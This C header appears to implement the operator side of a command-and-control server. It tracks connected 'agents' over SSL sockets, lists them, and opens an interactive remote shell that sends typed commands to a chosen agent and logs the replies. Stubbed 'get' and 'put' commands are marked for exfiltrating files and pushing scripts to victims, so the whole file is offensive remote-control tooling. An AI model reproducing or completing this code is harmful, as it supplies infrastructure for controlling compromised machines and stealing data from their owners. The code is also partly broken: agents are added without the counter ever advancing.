#ifndef Shell_Management_Header
#define Shell_Management_Header

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <stdint.h>
#include <openssl/ssl.h>
#include <openssl/sslerr.h>


// loging 
#include "log.h"
#include "secure_sockets.h"


#define buffer_len 256
#define max_response 20000
#define max_clients 20

pthread_t Thread[max_clients];
int connections_counter = 0;


struct host_t {
    char IP[buffer_len];
    //int port;
    int number;
    int Sock;
    SSL *ssl;
};

struct shell_args {
    int sock;
    char ip[buffer_len];
    SSL *ssl;
};

struct host_t host[max_clients]; // keep track of the clients


void addAgent(int NewSock, char* ip, SSL *Newssl) {
    strncpy(host[connections_counter].IP, ip, buffer_len);
    host[connections_counter].number = connections_counter;
    //host[connections_counter].port = ntohs(clientAddr.sin_port);
    host[connections_counter].Sock = NewSock;
    host[connections_counter].ssl = Newssl;
    }


int getAgentSockfd(int number) {
    return host[number].Sock;
}

void removeAgent(int number) {
    //int remove = number;
    for (int i  = number; i < connections_counter -1; i++) {
        host[i] = host[i+1];
    }
    connections_counter--;
}

void agentList() {
    if (connections_counter == 0) {
        printf("[-] No connections Yet...\n");
        return;
    }
    for (int i = 0; i < connections_counter;i++ ) {
        printf("IP:PORT %s | shell %d \n", host[i].IP, i+1);
    }
}



void *shell(void *arg) {
    struct shell_args *args = (struct shell_args*)arg;
    int sock = args->sock;
    char *ip = args->ip;
    SSL *ssl = args->ssl;

    char buffer[buffer_len]; // to send;
    char response[max_response];
    
    while (true) {
        
        memset(buffer, 0, sizeof(buffer));
        memset(response, 0, sizeof(response));
        
        printf("#shell@%s~$: ", ip); // inet_ntoa converst ip to string 
        fgets(buffer, sizeof(buffer), stdin);
        
        if (strlen(buffer) == 0) {
            printf("Input cannot be empty.\n");
            continue;
        }
        
        buffer[strcspn(buffer, "\n")] = 0;  

        
        if (SSL_write(ssl, buffer, sizeof(buffer)) == 0) {        
            perror("Write Error");
            continue;
        }

        if((strncmp("q", buffer, 1) == 0) || (strncmp("quit", buffer, 4) == 0) || (strncmp("exit", buffer, 4) == 0)) {
            break;
        } else {
            if (SSL_read(ssl, response, sizeof(response)) <= 0) {
                perror("recv Error");
                continue;
            }
            printf("%s\n", response);
            // log 
            log_communication_w_agents(buffer, ip, response);
        }
       
    }
    printf("[-] Closing Connection to %s\n", ip);
}

void commands() {
    char help[buffer_len] = "help - show this text\nshell (id) - spawn shell for that client\nview list - get list of all connected clients\naccept - wait for new connections \n";
    char cmd[buffer_len];
    do {
        memset(cmd, 0, sizeof(cmd));
        printf("cmd> ");
        fgets(cmd, sizeof(cmd), stdin);
        if (strlen(cmd) == 0) {
            printf("Input cannot be empty.\n");
            continue;
        }
        //strtok(cmd, "\n");
        cmd[strcspn(cmd, "\n")] = 0;  

        // log command
        log_commands(cmd);


        if (strncmp("accept", cmd, 6) == 0) {
            break;
        } else if (strncmp("get", cmd, 3) == 0) {
            // exfilitrate file

        } else if (strncmp("put", cmd, 3) == 0) {
            // send file/script
        } else if (strncmp("help", cmd, 4) ==0) {
            printf("%s", help);

        } else if (strncmp("shell", cmd, 5) == 0) {
            int num;
            sscanf(cmd, "shell %d", &num);
            // create thread

            struct shell_args *args = malloc(sizeof(struct shell_args));
            args->sock = getAgentSockfd(num);
            args->ssl = host[num].ssl;
            strncpy(args->ip, host[num].IP, buffer_len);

            shell((void*)args);
            // close connections
            
            //close_connection(args->ssl, args->sock);
            free(args);
            removeAgent(num);

        } else if (strncmp("view list", cmd, 9) == 0) {
            agentList();
        } else if ((strncmp("q", cmd, 1) == 0) || (strncmp("quit", cmd, 4) ==0) || (strncmp("exit", cmd, 4) == 0)) {
            printf("[-] Exiting ... \n ");
            exit(0);
        } else {
            printf("%s", help);
        }
    } while (true);

}

#endif